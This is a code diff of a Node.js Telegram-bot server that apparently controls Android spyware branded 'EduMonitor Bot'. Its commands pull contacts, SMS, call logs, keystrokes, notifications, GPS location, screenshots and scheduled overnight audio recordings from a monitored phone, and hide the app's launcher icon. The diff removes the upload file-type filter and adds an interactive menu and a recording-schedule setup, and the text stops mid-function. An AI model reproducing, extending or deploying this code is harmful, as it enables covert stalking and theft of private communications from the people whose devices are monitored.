@@ -14,10 +14,22 @@ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 // Store authorized devices and their commands
 const devices = new Map();
 
+// Store conversation states for interactive setup
+const userStates = new Map();
+
 // Store authorized chat IDs
 const authorizedChats = new Set([
     '5326373447', // Your chat ID
 ]);
+
+// Schedule states
+const SCHEDULE_STATES = {
+    IDLE: 'idle',
+    AWAITING_START_TIME: 'awaiting_start_time',
+    AWAITING_END_TIME: 'awaiting_end_time',
+    AWAITING_RECURRING: 'awaiting_recurring',
+    AWAITING_INTERVAL: 'awaiting_interval'
+};
 
 // Create uploads directory if it doesn't exist
 const uploadDir = 'uploads';
@@ -32,9 +44,10 @@ const storage = multer.diskStorage({
     },
     filename: (req, file, cb) => {
         const deviceId = req.body.deviceId || 'unknown';
+        const count = req.body.count || '0';
         const timestamp = Date.now();
         const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
-        cb(null, `${deviceId}-${timestamp}-${safeName}`);
+        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
     }
 });
 
@@ -43,25 +56,6 @@ const upload = multer({
     limits: { 
         fileSize: 50 * 1024 * 1024, // 50MB limit
         fieldSize: 50 * 1024 * 1024
-    },
-    fileFilter: (req, file, cb) => {
-        const allowedTypes = [
-            'text/plain',
-            'text/html',
-            'text/csv',
-            'application/json',
-            'application/octet-stream'
-        ];
-        
-        if (allowedTypes.includes(file.mimetype) || 
-            file.originalname.endsWith('.txt') ||
-            file.originalname.endsWith('.html') ||
-            file.originalname.endsWith('.csv') ||
-            file.originalname.endsWith('.json')) {
-            cb(null, true);
-        } else {
-            cb(new Error('File type not allowed'), false);
-        }
     }
 });
 
@@ -84,7 +78,7 @@ function sendJsonResponse(res, data, statusCode = 200) {
     }
 }
 
-// ============= INLINE KEYBOARD FUNCTIONS =============
+// ============= TELEGRAM MESSAGE FUNCTIONS =============
 
 async function sendTelegramMessage(chatId, text) {
     try {
@@ -124,7 +118,7 @@ async function sendTelegramMessage(chatId, text) {
 
 async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
     try {
-        console.log(`📨 Sending message with keyboard to ${chatId}`);
+        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
         
         const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: chatId,
@@ -174,6 +168,48 @@ async function answerCallbackQuery(callbackQueryId, text = null) {
     }
 }
 
+async function setChatMenuButton(chatId) {
+    try {
+        console.log(`🔘 Setting menu button for chat ${chatId}`);
+        
+        // Set both the menu button and commands
+        await axios.post(`${TELEGRAM_API}/setMyCommands`, {
+            commands: [
+                { command: 'help', description: '📋 Show main menu' },
+                { command: 'status', description: '📊 Device status' },
+                { command: 'location', description: '📍 Get GPS location' },
+                { command: 'screenshot', description: '📸 Take screenshot' },
+                { command: 'record', description: '🎤 Start recording' },
+                { command: 'contacts', description: '📇 Get contacts' },
+                { command: 'sms', description: '💬 Get SMS' },
+                { command: 'calllogs', description: '📞 Get call logs' },
+                { command: 'storage', description: '💾 Storage info' },
+                { command: 'network', description: '📡 Network info' },
+                { command: 'battery', description: '🔋 Battery level' },
+                { command: 'small', description: '📏 Small screenshots' },
+                { command: 'medium', description: '📏 Medium screenshots' },
+                { command: 'original', description: '📏 Original screenshots' },
+                { command: 'record_auto_on', description: '⏰ Enable auto recording' },
+                { command: 'record_auto_off', description: '⏰ Disable auto recording' },
+                { command: 'record_schedule', description: '📅 Check schedule' }
+            ]
+        });
+        
+        // Also set the menu button text (appears above input field)
+        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
+            chat_id: chatId,
+            menu_button: {
+                type: 'commands',
+                text: 'Menu'
+            }
+        });
+        
+        console.log(`✅ Menu button and commands set for chat ${chatId}`);
+    } catch (error) {
+        console.error('Error setting menu button:', error.response?.data || error.message);
+    }
+}
+
 // Helper to create inline buttons
 function createInlineButton(text, callbackData) {
     return {
@@ -217,8 +253,7 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
             const stats = fs.statSync(filePath);
             await sendTelegramMessage(chatId, 
                 `⚠️ File too large to send directly.\n\n` +
-                `The ${caption} file is ${(stats.size / 1024).toFixed(2)} KB.\n` +
-                `Try using the TXT format instead of HTML for smaller size.`);
+                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
         } catch (e) {
             console.error('Error sending fallback message:', e);
         }
@@ -244,26 +279,15 @@ function formatLocationMessage(locationData) {
             const lon = locData.lon;
             const accuracy = locData.accuracy || 'Unknown';
             const provider = locData.provider || 'unknown';
-            const altitude = locData.altitude || 0;
-            const speed = locData.speed || 0;
             
             const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            let timeStr = '';
-            if (locData.time) {
-                const date = new Date(locData.time);
-                timeStr = date.toLocaleString();
-            }
             
             return {
                 text: `📍 <b>Location Update</b>\n\n` +
                       `• <b>Latitude:</b> <code>${lat}</code>\n` +
                       `• <b>Longitude:</b> <code>${lon}</code>\n` +
                       `• <b>Accuracy:</b> ±${accuracy}m\n` +
-                      `• <b>Provider:</b> ${provider}\n` +
-                      `${altitude ? `• <b>Altitude:</b> ${altitude.toFixed(1)}m\n` : ''}` +
-                      `${speed ? `• <b>Speed:</b> ${speed.toFixed(1)} m/s\n` : ''}` +
-                      `${timeStr ? `• <b>Time:</b> ${timeStr}\n` : ''}\n` +
+                      `• <b>Provider:</b> ${provider}\n\n` +
                       `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                 mapsUrl: mapsUrl,
                 lat: lat,
@@ -277,429 +301,27 @@ function formatLocationMessage(locationData) {
     }
 }
 
-// ============= FILE FORMATTERS =============
+// ============= MAIN MENU KEYBOARD =============
 
-function formatContactsAsHTML(contacts) {
-    let html = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Contacts Export</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }
-        .contact { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .name { font-size: 18px; font-weight: bold; color: #4CAF50; }
-        .number { font-size: 16px; color: #666; margin-top: 5px; }
-        .count { background: #4CAF50; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
-    </style>
-</head>
-<body>
-    <h1>📇 Contacts Export</h1>
-    <div class="count">Total Contacts: ${contacts.length}</div>
-    <hr>`;
-
-    contacts.forEach((contact, index) => {
-        html += `
-    <div class="contact">
-        <div class="name">${index + 1}. ${contact.name || 'Unknown'}</div>
-        <div class="number">📞 ${contact.number || 'No number'}</div>
-    </div>`;
-    });
-
-    html += `
-</body>
-</html>`;
-    return html;
-}
-
-function formatContactsAsTXT(contacts) {
-    let text = "📇 CONTACTS EXPORT\n";
-    text += "=".repeat(50) + "\n";
-    text += `Total Contacts: ${contacts.length}\n`;
-    text += "=".repeat(50) + "\n\n";
-
-    contacts.forEach((contact, index) => {
-        text += `${index + 1}. Name: ${contact.name || 'Unknown'}\n`;
-        text += `   Phone: ${contact.number || 'No number'}\n`;
-        text += "-".repeat(30) + "\n";
-    });
-
-    return text;
-}
-
-function formatSMSAsHTML(messages) {
-    let html = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>SMS Export</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        h1 { color: #333; border-bottom: 2px solid #2196F3; padding-bottom: 10px; }
-        .message { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .incoming { border-left: 4px solid #4CAF50; }
-        .sent { border-left: 4px solid #2196F3; }
-        .address { font-size: 16px; font-weight: bold; color: #333; }
-        .body { font-size: 14px; color: #666; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 5px; }
-        .time { font-size: 12px; color: #999; margin-top: 5px; }
-        .count { background: #2196F3; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
-    </style>
-</head>
-<body>
-    <h1>💬 SMS Messages Export</h1>
-    <div class="count">Total Messages: ${messages.length}</div>
-    <hr>`;
-
-    messages.forEach((msg, index) => {
-        const typeClass = msg.type === 'INBOX' ? 'incoming' : 'sent';
-        const typeIcon = msg.type === 'INBOX' ? '📥' : '📤';
-        const date = new Date(parseInt(msg.date));
-        
-        html += `
-    <div class="message ${typeClass}">
-        <div class="address">${typeIcon} ${msg.address}</div>
-        <div class="body">${msg.body.replace(/\n/g, '<br>')}</div>
-        <div class="time">${date.toLocaleString()}</div>
-    </div>`;
-    });
-
-    html += `
-</body>
-</html>`;
-    return html;
-}
-
-function formatSMSAsTXT(messages) {
-    let text = "💬 SMS MESSAGES EXPORT\n";
-    text += "=".repeat(50) + "\n";
-    text += `Total Messages: ${messages.length}\n`;
-    text += "=".repeat(50) + "\n\n";
-
-    messages.forEach((msg, index) => {
-        const type = msg.type === 'INBOX' ? 'INCOMING' : 'SENT';
-        const date = new Date(parseInt(msg.date));
-        
-        text += `[${index + 1}] ${type} - ${date.toLocaleString()}\n`;
-        text += `From/To: ${msg.address}\n`;
-        text += `Message: ${msg.body}\n`;
-        text += "-".repeat(40) + "\n\n";
-    });
-
-    return text;
-}
-
-function formatCallLogsAsHTML(calls) {
-    let html = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Call Logs Export</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        h1 { color: #333; border-bottom: 2px solid #FF9800; padding-bottom: 10px; }
-        .call { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .incoming { border-left: 4px solid #4CAF50; }
-        .outgoing { border-left: 4px solid #2196F3; }
-        .missed { border-left: 4px solid #f44336; }
-        .number { font-size: 16px; font-weight: bold; color: #333; }
-        .details { font-size: 14px; color: #666; margin-top: 5px; }
-        .time { font-size: 12px; color: #999; margin-top: 5px; }
-        .count { background: #FF9800; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
-    </style>
-</head>
-<body>
-    <h1>📞 Call Logs Export</h1>
-    <div class="count">Total Calls: ${calls.length}</div>
-    <hr>`;
-
-    calls.forEach((call, index) => {
-        const typeClass = call.type === 'INCOMING' ? 'incoming' : (call.type === 'OUTGOING' ? 'outgoing' : 'missed');
-        const typeIcon = call.type === 'INCOMING' ? '⬇️' : (call.type === 'OUTGOING' ? '⬆️' : '❌');
-        const date = new Date(parseInt(call.date));
-        const caller = call.name || call.number;
-        
-        html += `
-    <div class="call ${typeClass}">
-        <div class="number">${typeIcon} ${caller}</div>
-        <div class="details">Type: ${call.type} | Duration: ${call.duration}s</div>
-        <div class="time">${date.toLocaleString()}</div>
-    </div>`;
-    });
-
-    html += `
-</body>
-</html>`;
-    return html;
-}
-
-function formatCallLogsAsTXT(calls) {
-    let text = "📞 CALL LOGS EXPORT\n";
-    text += "=".repeat(50) + "\n";
-    text += `Total Calls: ${calls.length}\n`;
-    text += "=".repeat(50) + "\n\n";
-
-    calls.forEach((call, index) => {
-        const date = new Date(parseInt(call.date));
-        const caller = call.name || call.number;
-        
-        text += `[${index + 1}] ${call.type} Call\n`;
-        text += `Number: ${caller}\n`;
-        text += `Duration: ${call.duration} seconds\n`;
-        text += `Time: ${date.toLocaleString()}\n`;
-        text += "-".repeat(40) + "\n\n";
-    });
-
-    return text;
-}
-
-function formatAppsAsHTML(apps) {
-    let html = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Installed Apps Export</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        h1 { color: #333; border-bottom: 2px solid #9C27B0; padding-bottom: 10px; }
-        .app { background: white; margin: 5px 0; padding: 10px 15px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .system { background: #e3f2fd; }
-        .user { background: #f1f8e9; }
-        .name { font-size: 14px; font-weight: bold; color: #333; }
-        .package { font-size: 12px; color: #666; font-family: monospace; }
-        .count { background: #9C27B0; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
-    </style>
-</head>
-<body>
-    <h1>📱 Installed Apps Export</h1>
-    <div class="count">Total Apps: ${apps.length}</div>
-    <hr>`;
-
-    apps.forEach((app, index) => {
-        const isSystem = app.isSystem === 'true';
-        const appClass = isSystem ? 'system' : 'user';
-        const icon = isSystem ? '⚙️' : '📱';
-        
-        html += `
-    <div class="app ${appClass}">
-        <div class="name">${icon} ${app.name}</div>
-        <div class="package">${app.package}</div>
-    </div>`;
-    });
-
-    html += `
-</body>
-</html>`;
-    return html;
-}
-
-function formatAppsAsTXT(apps) {
-    let text = "📱 INSTALLED APPS EXPORT\n";
-    text += "=".repeat(50) + "\n";
-    text += `Total Apps: ${apps.length}\n`;
-    text += "=".repeat(50) + "\n\n";
-
-    apps.forEach((app, index) => {
-        const type = app.isSystem === 'true' ? '[SYSTEM]' : '[USER]';
-        text += `${index + 1}. ${type} ${app.name}\n`;
-        text += `   Package: ${app.package}\n`;
-    });
-
-    return text;
-}
-
-function formatKeystrokesAsHTML(keystrokes) {
-    let html = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Keystroke Logs Export</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        h1 { color: #333; border-bottom: 2px solid #607D8B; padding-bottom: 10px; }
-        .keystroke { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .app { font-size: 14px; color: #607D8B; font-weight: bold; }
-        .text { font-size: 14px; color: #333; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 5px; font-family: monospace; }
-        .time { font-size: 12px; color: #999; margin-top: 5px; }
-        .count { background: #607D8B; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
-    </style>
-</head>
-<body>
-    <h1>⌨️ Keystroke Logs Export</h1>
-    <div class="count">Total Keystrokes: ${keystrokes.length}</div>
-    <hr>`;
-
-    keystrokes.forEach((log, index) => {
-        const date = new Date(log.timestamp);
-        const app = log.packageName || 'unknown';
-        
-        html += `
-    <div class="keystroke">
-        <div class="app">📱 ${app}</div>
-        <div class="text">${log.data || ''}</div>
-        <div class="time">${date.toLocaleString()}</div>
-    </div>`;
-    });
-
-    html += `
-</body>
-</html>`;
-    return html;
-}
-
-function formatKeystrokesAsTXT(keystrokes) {
-    let text = "⌨️ KEYSTROKE LOGS EXPORT\n";
-    text += "=".repeat(50) + "\n";
-    text += `Total Keystrokes: ${keystrokes.length}\n`;
-    text += "=".repeat(50) + "\n\n";
-
-    keystrokes.forEach((log, index) => {
-        const date = new Date(log.timestamp);
-        text += `[${index + 1}] ${date.toLocaleString()}\n`;
-        text += `App: ${log.packageName || 'unknown'}\n`;
-        text += `Text: ${log.data || ''}\n`;
-        text += "-".repeat(40) + "\n\n";
-    });
-
-    return text;
-}
-
-function formatNotificationsAsHTML(notifications) {
-    let html = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Notifications Export</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        h1 { color: #333; border-bottom: 2px solid #FF5722; padding-bottom: 10px; }
-        .notification { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); border-left: 4px solid #FF5722; }
-        .app { font-size: 14px; color: #FF5722; font-weight: bold; }
-        .title { font-size: 16px; font-weight: bold; color: #333; margin-top: 5px; }
-        .text { font-size: 14px; color: #666; margin-top: 10px; }
-        .time { font-size: 12px; color: #999; margin-top: 5px; }
-        .count { background: #FF5722; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
-    </style>
-</head>
-<body>
-    <h1>🔔 Notifications Export</h1>
-    <div class="count">Total Notifications: ${notifications.length}</div>
-    <hr>`;
-
-    notifications.forEach((log, index) => {
-        const date = new Date(log.timestamp);
-        const app = log.packageName || 'unknown';
-        
-        html += `
-    <div class="notification">
-        <div class="app">📱 ${app}</div>
-        <div class="title">${log.title || ''}</div>
-        <div class="text">${log.data || ''}</div>
-        <div class="time">${date.toLocaleString()}</div>
-    </div>`;
-    });
-
-    html += `
-</body>
-</html>`;
-    return html;
-}
-
-function formatNotificationsAsTXT(notifications) {
-    let text = "🔔 NOTIFICATIONS EXPORT\n";
-    text += "=".repeat(50) + "\n";
-    text += `Total Notifications: ${notifications.length}\n`;
-    text += "=".repeat(50) + "\n\n";
-
-    notifications.forEach((log, index) => {
-        const date = new Date(log.timestamp);
-        text += `[${index + 1}] ${date.toLocaleString()}\n`;
-        text += `App: ${log.packageName || 'unknown'}\n`;
-        if (log.title) text += `Title: ${log.title}\n`;
-        if (log.data) text += `Content: ${log.data}\n`;
-        text += "-".repeat(40) + "\n\n";
-    });
-
-    return text;
-}
-
-// ============= COMMAND HELPERS =============
-
-function getHelpMessage() {
-    return `<b>🤖 COMPLETE COMMAND LIST</b>
-
-<b>🔍 MONITORING COMMANDS</b>
-/help - Get help 
-/status - Get full device status
-/location - Get current GPS location (returns map link + pin)
-/battery - Get battery level only
-/storage - Get storage information
-/network - Get network info (IP, WiFi, Mobile)
-
-<b>📸 SCREENSHOT SIZE COMMANDS</b>
-/small - Max compression, smallest files
-/medium - Balanced quality/size
-/original - Best quality, largest files
-/size_status - Check current size setting
-/screenshot_settings - View all settings
-
-<b>📱 DATA EXTRACTION COMMANDS - RETURNS AS FILES</b>
-/contacts_txt - Get contacts as TXT file
-/contacts_html - Get contacts as HTML file
-/sms_txt - Get SMS messages as TXT file
-/sms_html - Get SMS messages as HTML file
-/calllogs_txt - Get call logs as TXT file
-/calllogs_html - Get call logs as HTML file
-/apps_txt - Get apps list as TXT file
-/apps_html - Get apps list as HTML file
-/keystrokes_txt - Get keystrokes as TXT file
-/keystrokes_html - Get keystrokes as HTML file
-/notifications_txt - Get notifications as TXT file
-/notifications_html - Get notifications as HTML file
-
-<b>🎤 RECORDING COMMANDS</b>
-/record - Start 60s audio recording
-/start_recording - Start scheduled recording
-/stop_recording - Stop recording service
-
-<b>⏰ RECORDING SCHEDULE COMMANDS (NEW)</b>
-/record_auto_on - Enable auto schedule (23:00-04:00 daily, every 15min)
-/record_auto_off - Disable auto schedule
-/record_schedule - Check current schedule status
-/record_custom HH:MM HH:MM [daily/once] [interval] - Set custom schedule
-   Example: /record_custom 22:00 02:00 daily 15
-   Example: /record_custom 23:30 05:30 once 30
-
-<b>⚙️ SERVICE CONTROL</b>
-/start_screenshot - Start screenshot service
-/stop_screenshot - Stop screenshot service
-/start_stream - Start streaming
-/stop_stream - Stop streaming
-/reboot_app - Restart all services
-
-<b>🛠️ UTILITY COMMANDS</b>
-/ping - Test connection
-/time - Get device time
-/info - Get detailed device info
-/hide_icon - Hide launcher icon
-/show_icon - Show launcher icon
-
-<b>📊 STATS COMMANDS</b>
-/logs_count - Get total log count
-/logs_recent - Get 10 most recent logs
-/stats - Get detailed statistics
-/clear_logs - Clear all logs
-
-<b>📋 FILE FORMATS</b>
-• TXT files - Simple text format
-• HTML files - Formatted with styling
-All files are sent as downloadable documents`;
+function getMainMenuKeyboard() {
+    return [
+        [
+            createInlineButton('📱 Data', 'menu_data'),
+            createInlineButton('🎤 Recording', 'menu_recording')
+        ],
+        [
+            createInlineButton('📸 Screenshot', 'menu_screenshot'),
+            createInlineButton('⚙️ Services', 'menu_services')
+        ],
+        [
+            createInlineButton('📍 Location', 'menu_location'),
+            createInlineButton('📊 Stats', 'menu_stats')
+        ],
+        [
+            createInlineButton('ℹ️ About', 'menu_about'),
+            createInlineButton('❌ Close', 'close_menu')
+        ]
+    ];
 }
 
 // ============= WEBHOOK ENDPOINT =============
@@ -710,7 +332,7 @@ app.post('/webhook', async (req, res) => {
     setImmediate(async () => {
         try {
             const update = req.body;
-            console.log('📩 Received update:', JSON.stringify(update, null, 2));
+            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));
 
             // Handle callback queries (button clicks)
             if (update.callback_query) {
@@ -734,8 +356,27 @@ app.post('/webhook', async (req, res) => {
                 return;
             }
 
+            // Set menu button for authorized users
+            await setChatMenuButton(chatId);
+
+            // Check if user is in a conversation state
+            const userState = userStates.get(chatId);
+            
+            if (userState) {
+                await handleConversationMessage(chatId, text, messageId, userState);
+                return;
+            }
+
+            // Regular command handling
             if (text?.startsWith('/')) {
                 await handleCommand(chatId, text, messageId);
+            } else {
+                // Handle non-command messages
+                await sendTelegramMessageWithKeyboard(
+                    chatId,
+                    "🤖 Use the menu button below or type /help to see available commands.",
+                    getMainMenuKeyboard()
+                );
             }
         } catch (error) {
             console.error('❌ Error processing webhook:', error);
@@ -758,25 +399,7 @@ async function handleCallbackQuery(callbackQuery) {
     
     // Handle different callback data
     if (data === 'help_main') {
-        const keyboard = [
-            [
-                createInlineButton('📱 Data', 'menu_data'),
-                createInlineButton('🎤 Recording', 'menu_recording')
-            ],
-            [
-                createInlineButton('📸 Screenshot', 'menu_screenshot'),
-                createInlineButton('⚙️ Services', 'menu_services')
-            ],
-            [
-                createInlineButton('📍 Location', 'menu_location'),
-                createInlineButton('📊 Stats', 'menu_stats')
-            ],
-            [
-                createInlineButton('❌ Close', 'close_menu')
-            ]
-        ];
-        
-        await editMessageKeyboard(chatId, messageId, keyboard);
+        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard());
         
     } else if (data === 'menu_data') {
         const keyboard = [
@@ -808,7 +431,6 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
-        
         await editMessageKeyboard(chatId, messageId, keyboard);
         
     } else if (data === 'menu_recording') {
@@ -822,8 +444,8 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
             ],
             [
-                createInlineButton('⚙️ Custom Schedule', 'help_custom'),
-                createInlineButton('🎚️ Audio Quality', 'menu_audio')
+                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive'),
+                createInlineButton('🎚️ Audio Info', 'cmd:audio_info')
             ],
             [
                 createInlineButton('▶️ Start Recording', 'cmd:start_recording'),
@@ -833,28 +455,6 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
-        
-        await editMessageKeyboard(chatId, messageId, keyboard);
-        
-    } else if (data === 'menu_audio') {
-        const keyboard = [
-            [
-                createInlineButton('🔊 Ultra Low', 'cmd:audio_ultra'),
-                createInlineButton('🔊 Very Low', 'cmd:audio_very_low')
-            ],
-            [
-                createInlineButton('🔊 Low', 'cmd:audio_low'),
-                createInlineButton('🔊 Medium', 'cmd:audio_medium')
-            ],
-            [
-                createInlineButton('🔊 High', 'cmd:audio_high'),
-                createInlineButton('ℹ️ Info', 'cmd:audio_info')
-            ],
-            [
-                createInlineButton('◀️ Back', 'menu_recording')
-            ]
-        ];
-        
         await editMessageKeyboard(chatId, messageId, keyboard);
         
     } else if (data === 'menu_screenshot') {
@@ -880,14 +480,13 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('🔄 Auto OFF', 'cmd:auto_off')
             ],
             [
-                createInlineButton('📱 Target Apps', 'cmd:target_apps'),
-                createInlineButton('📊 Status', 'cmd:auto_screenshot_status')
+                createInlineButton('📊 Compression Stats', 'cmd:compression_stats'),
+                createInlineButton('📱 Target Apps', 'cmd:target_apps')
             ],
             [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
-        
         await editMessageKeyboard(chatId, messageId, keyboard);
         
     } else if (data === 'menu_services') {
@@ -908,7 +507,6 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
-        
         await editMessageKeyboard(chatId, messageId, keyboard);
         
     } else if (data === 'menu_location') {
@@ -933,7 +531,6 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
-        
         await editMessageKeyboard(chatId, messageId, keyboard);
         
     } else if (data === 'menu_stats') {
@@ -954,25 +551,84 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
-        
         await editMessageKeyboard(chatId, messageId, keyboard);
         
+    } else if (data === 'menu_about') {
+        const keyboard = [
+            [
+                createUrlButton('🔗 GitHub', 'https://github.com/your-repo'),
+                createInlineButton('📞 Contact', 'contact_support')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        await sendTelegramMessage(chatId,
+            "🤖 <b>EduMonitor Bot</b>\n\n" +
+            "Version: 2.0\n" +
+            "Features:\n" +
+            "• Remote device monitoring\n" +
+            "• Screenshot capture\n" +
+            "• Audio recording\n" +
+            "• Data extraction (contacts, SMS, etc.)\n" +
+            "• Location tracking\n" +
+            "• Schedule recording\n\n" +
+            "Use the menu below to navigate.");
+        
+    } else if (data === 'contact_support') {
+        await answerCallbackQuery(callbackId, "Support: your.email@example.com");
+        
     } else if (data === 'close_menu') {
-        // Remove keyboard
         await editMessageKeyboard(chatId, messageId, []);
+        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
+        
+    } else if (data === 'start_custom_schedule_interactive') {
+        // Start interactive setup
+        userStates.set(chatId, {
+            state: SCHEDULE_STATES.AWAITING_START_TIME,
+            data: {}
+        });
+        
+        const keyboard = [[createInlineButton('❌ Cancel', 'cancel_setup')]];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+        await sendTelegramMessage(chatId, 
+            "⚙️ *Custom Schedule Setup*\n\n" +
+            "Please enter the START time in 24-hour format (HH:MM)\n" +
+            "Example: `22:00` for 10:00 PM");
+        
+    } else if (data === 'cancel_setup') {
+        userStates.delete(chatId);
+        await editMessageKeyboard(chatId, messageId, []);
+        await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
+        
+    } else if (data.startsWith('recurring:')) {
+        const recurring = data.split(':')[1];
+        const userState = userStates.get(chatId);
+        
+        if (userState && userState.state === SCHEDULE_STATES.AWAITING_RECURRING) {
+            userState.data.recurring = recurring === 'daily';
+            userState.state = SCHEDULE_STATES.AWAITING_INTERVAL;
+            
+            await editMessageKeyboard(chatId, messageId, []);
+            await sendTelegramMessage(chatId, 
+                "✅ Schedule type recorded.\n\n" +
+                "Finally, enter the recording interval in minutes (e.g., 15, 30, 60):");
+        }
         
     } else if (data.startsWith('cmd:')) {
         // Execute a command
         const command = data.substring(4);
         console.log(`🎯 Executing command from button: ${command}`);
         
-        // Show loading indicator
         await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
         
         // Forward to command handler
         await handleCommand(chatId, `/${command}`, messageId);
         
-        // Update keyboard to show command was sent
+        // Update keyboard
         const keyboard = [
             [
                 createInlineButton('✅ Command Sent', 'noop'),
@@ -980,16 +636,87 @@ async function handleCallbackQuery(callbackQuery) {
             ]
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
-        
-    } else if (data === 'help_custom') {
-        await sendTelegramMessage(chatId, 
-            "⚙️ <b>Custom Schedule Format</b>\n\n" +
-            "<code>/record_custom HH:MM HH:MM [daily/once] [interval]</code>\n\n" +
-            "<b>Examples:</b>\n" +
-            "• <code>/record_custom 22:00 02:00 daily 15</code>\n" +
-            "  (Daily 10 PM to 2 AM, save every 15 min)\n\n" +
-            "• <code>/record_custom 23:30 05:30 once 30</code>\n" +
-            "  (One-time 11:30 PM to 5:30 AM, save every 30 min)");
+    }
+}
+
+// ============= CONVERSATION HANDLER =============
+
+async function handleConversationMessage(chatId, text, messageId, userState) {
+    console.log(`💬 Conversation message: ${text} in state ${userState.state}`);
+    
+    switch (userState.state) {
+        case SCHEDULE_STATES.AWAITING_START_TIME:
+            // Validate start time format
+            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
+                await sendTelegramMessage(chatId, 
+                    "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
+                return;
+            }
+            
+            userState.data.startTime = text;
+            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
+            
+            await sendTelegramMessage(chatId, 
+                "✅ Start time recorded.\n\n" +
+                "Now enter the END time (HH:MM)\n" +
+                "Example: `02:00` for 2:00 AM");
+            break;
+            
+        case SCHEDULE_STATES.AWAITING_END_TIME:
+            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
+                await sendTelegramMessage(chatId, 
+                    "❌ Invalid time format. Please use HH:MM (e.g., 02:00)");
+                return;
+            }
+            
+            userState.data.endTime = text;
+            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
+            
+            const keyboard = [
+                [
+                    createInlineButton('✅ Daily', 'recurring:daily'),
+                    createInlineButton('🔄 Once', 'recurring:once')
+                ]
+            ];
+            
+            await sendTelegramMessageWithKeyboard(
+                chatId,
+                "✅ End time recorded.\n\n" +
+                "Should this schedule repeat daily or run once?",
+                keyboard
+            );
+            break;
+            
+        case SCHEDULE_STATES.AWAITING_INTERVAL:
+            const interval = parseInt(text);
+            if (isNaN(interval) || interval < 5 || interval > 120) {
+                await sendTelegramMessage(chatId, 
